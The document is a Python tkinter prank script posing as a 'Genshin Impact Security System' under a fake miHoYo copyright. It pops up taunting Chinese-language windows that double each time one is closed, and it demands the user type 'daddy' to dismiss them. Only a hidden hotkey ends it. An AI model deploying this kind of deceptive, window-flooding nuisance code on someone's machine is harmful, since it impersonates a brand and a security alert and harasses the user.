import tkinter as tk
from tkinter import messagebox
import random
import keyboard
import os
import sys

# --- 配置 ---
PROGRAM_TITLE = "Genshin Impact Security System"
ICO_FILENAME = "genshin.ico"
SIGNATURE = "© miHoYo. All Rights Reserved."

TAUNTS = [
    "你真的以为点 ❌ 有用吗？",
    "关不掉的，别试了。",
    "再点一次看看？😄",
    "你很执着，但没用。",
    "窗口：我裂开了，但没完全裂。",
    "系统：已记录你的无效操作。",
    "你在和谁较劲？",
    "放弃吧，叫爸爸才是最优解的答案。",
    "系统，你这玩家有点意思awa"
]

def force_exit():
    os._exit(0)

keyboard.add_hotkey('ctrl+l+a', force_exit)

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

class LockWindow:
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.title(PROGRAM_TITLE)

        # 随机位置
        w, h = 400, 250
        sw = self.win.winfo_screenwidth()
        sh = self.win.winfo_screenheight()
        x = random.randint(0, max(0, sw - w))
        y = random.randint(0, max(0, sh - h))
        self.win.geometry(f"{w}x{h}+{x}+{y}")

        self.win.attributes("-topmost", True)
        self.win.configure(bg="#f2f2f2")
        self.win.resizable(False, False)

        icon_path = get_resource_path(ICO_FILENAME)
        if os.path.exists(icon_path):
            try:
                self.win.iconbitmap(icon_path)
            except:
                pass

        self.win.protocol("WM_DELETE_WINDOW", self.on_closing)

        # --- UI ---
        tk.Label(
            self.win,
            text="⚠️⚠️⚠️系统安全警告",
            fg="red",
            bg="#f2f2f2",
            font=("微软雅黑", 14, "bold")
        ).pack(pady=10)

        tk.Label(
            self.win,
            text=random.choice(TAUNTS),
            fg="#333333",
            bg="#f2f2f2",
            font=("微软雅黑", 10)
        ).pack(pady=5)

        tk.Label(
            self.win,
            text="叫一声爸爸以开启原神：",
            bg="#f2f2f2"
        ).pack()

        self.entry = tk.Entry(self.win, font=("微软雅黑", 12), justify="center")
        self.entry.pack(pady=10, padx=50, fill="x")
        self.entry.focus_set()

        tk.Button(
            self.win,
            text="立即执行",
            command=self.check,
            bg="#3b82f6",
            fg="white",
            height=2,
            relief="flat"
        ).pack(pady=5, padx=100, fill="x")

        tk.Label(
            self.win,
            text=SIGNATURE,
            fg="#999999",
            bg="#f2f2f2",
            font=("Arial", 8)
        ).pack(side="bottom", pady=5)

    def on_closing(self):
        messagebox.showwarning("声明", "你还想关掉？告诉你不可能的")

        # 关闭当前窗口
        self.win.destroy()

        # 指数级增长：每关一个 → 生成两个
        LockWindow(self.master)
        LockWindow(self.master)

    def check(self):
        if self.entry.get().strip() == "爸爸":
            messagebox.showinfo("不管了", "欸乖儿砸")
            self.win.destroy()
        else:
            messagebox.showerror("错误", "一点都不乖啊！")
            self.entry.delete(0, tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()  # 隐藏主窗口

    # 初始窗口
    LockWindow(root)

    # 整个程序只允许一个 mainloop
    root.mainloop()
